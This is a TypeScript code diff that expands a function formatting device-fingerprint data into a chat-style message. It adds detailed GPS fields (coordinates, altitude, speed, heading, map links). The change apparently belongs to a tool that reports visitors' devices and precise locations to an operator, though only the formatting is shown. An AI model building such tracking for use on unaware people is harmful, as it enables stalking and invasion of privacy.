@@ -56,13 +56,29 @@ export function formatFingerprint(fp: DeviceFingerprint | undefined, ipInfo: IpI
     message += `   • Effective Type: ${fp.connectionInfo.effectiveType}\n`;
   }
   
-  // GPS Location
+  // GPS Location - DETAILED
   if (fp.gpsLocation) {
-    message += `\n📍 <b>GPS Location:</b>\n`;
-    message += `   • Latitude: ${fp.gpsLocation.latitude}\n`;
-    message += `   • Longitude: ${fp.gpsLocation.longitude}\n`;
-    message += `   • Accuracy: ${Math.round(fp.gpsLocation.accuracy)} meters\n`;
-    message += `   • Google Maps: ${fp.gpsLocation.googleMapsUrl}\n`;
+    message += `\n<b>GPS LOCATION (ACCURATE):</b>\n`;
+    message += `   Latitude: ${fp.gpsLocation.latitude}\n`;
+    message += `   Longitude: ${fp.gpsLocation.longitude}\n`;
+    message += `   Accuracy: ${Math.round(fp.gpsLocation.accuracy)} meters\n`;
+    if (fp.gpsLocation.altitude !== undefined) {
+      message += `   Altitude: ${Math.round(fp.gpsLocation.altitude)} meters\n`;
+    }
+    if (fp.gpsLocation.speed !== undefined && fp.gpsLocation.speed > 0) {
+      message += `   Speed: ${(fp.gpsLocation.speed * 3.6).toFixed(1)} km/h\n`;
+    }
+    if (fp.gpsLocation.heading !== undefined) {
+      message += `   Heading: ${Math.round(fp.gpsLocation.heading)} degrees\n`;
+    }
+    message += `\n   <b>GOOGLE MAPS:</b>\n`;
+    message += `   ${fp.gpsLocation.googleMapsUrl}\n`;
+    if (fp.gpsLocation.googleMapsEmbed) {
+      message += `   ${fp.gpsLocation.googleMapsEmbed}\n`;
+    }
+  } else {
+    message += `\n<b>GPS LOCATION:</b>\n`;
+    message += `   Not available (permission denied or not supported)\n`;
   }
   
   // IP Location (from ipInfo)
